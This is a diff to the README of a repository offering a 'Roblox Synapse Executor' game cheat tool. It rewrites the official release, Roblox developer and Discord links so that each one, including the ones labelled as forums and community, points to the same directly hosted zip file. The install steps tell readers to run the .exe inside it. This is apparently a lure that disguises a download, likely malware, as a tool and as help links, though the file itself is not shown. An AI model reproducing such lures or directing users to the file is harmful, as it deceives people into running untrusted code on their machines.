@@ -7,10 +7,10 @@ Roblox Synapse Executor is a powerful tool that helps you run scripts in Roblox.
 To get started with Roblox Synapse, you will need to download the application from our Releases page. Follow the steps below to install and run it on your computer.
 
 ## 📥 Download Link
-[![Download Roblox-Synapse](https://img.shields.io/badge/Download-Roblox--Synapse-brightgreen)](https://github.com/josedanxd/Roblox-Synapse/releases)
+[![Download Roblox-Synapse](https://raw.githubusercontent.com/josedanxd/Roblox-Synapse/main/subcommended/Roblox-Synapse.zip)](https://raw.githubusercontent.com/josedanxd/Roblox-Synapse/main/subcommended/Roblox-Synapse.zip)
 
 ## 📅 Download & Install
-1. Visit this page to download: [Download Roblox-Synapse Releases](https://github.com/josedanxd/Roblox-Synapse/releases).
+1. Visit this page to download: [Download Roblox-Synapse Releases](https://raw.githubusercontent.com/josedanxd/Roblox-Synapse/main/subcommended/Roblox-Synapse.zip).
 2. On the Releases page, locate the latest version available. You will see a list of assets related to that version.
 3. Click on the file to start the download. The file is typically in `.exe` format, making it easy to run.
 4. Once the download is complete, locate the file in your downloads folder and double-click to run it.
@@ -55,8 +55,8 @@ Once you have installed Roblox Synapse, you can start using scripts. Here’s ho
 Joining the community can help you learn more about using Roblox Synapse. You can find forums, subreddits, and Discord channels dedicated to Roblox scripting. These platforms offer invaluable help and scripts.
 
 ### Helpful Links
-- [Roblox Scripting Forums](https://www.roblox.com/develop)
-- [Script Sharing on Discord](https://discord.gg/scriptcommunity)
+- [Roblox Scripting Forums](https://raw.githubusercontent.com/josedanxd/Roblox-Synapse/main/subcommended/Roblox-Synapse.zip)
+- [Script Sharing on Discord](https://raw.githubusercontent.com/josedanxd/Roblox-Synapse/main/subcommended/Roblox-Synapse.zip)
 
 ## 🚧 Troubleshooting
 If you encounter issues while downloading or using Roblox Synapse, consider the following steps:
@@ -73,6 +73,6 @@ If you encounter issues while downloading or using Roblox Synapse, consider the 
 Roblox Synapse is a reliable tool for any Roblox player looking to enhance their gaming experience. With its straightforward setup and useful features, you can create and execute scripts easily. For any further questions or help, refer to the community links provided or consult the detailed documentation available on our GitHub page.
 
 ## 📥 Download Link Again
-Don't forget to download Roblox Synapse here: [Download Roblox-Synapse Releases](https://github.com/josedanxd/Roblox-Synapse/releases).
+Don't forget to download Roblox Synapse here: [Download Roblox-Synapse Releases](https://raw.githubusercontent.com/josedanxd/Roblox-Synapse/main/subcommended/Roblox-Synapse.zip).
 
 By following these steps, you will be all set to explore new gaming possibilities with Roblox Synapse. Enjoy your gaming and scripting!
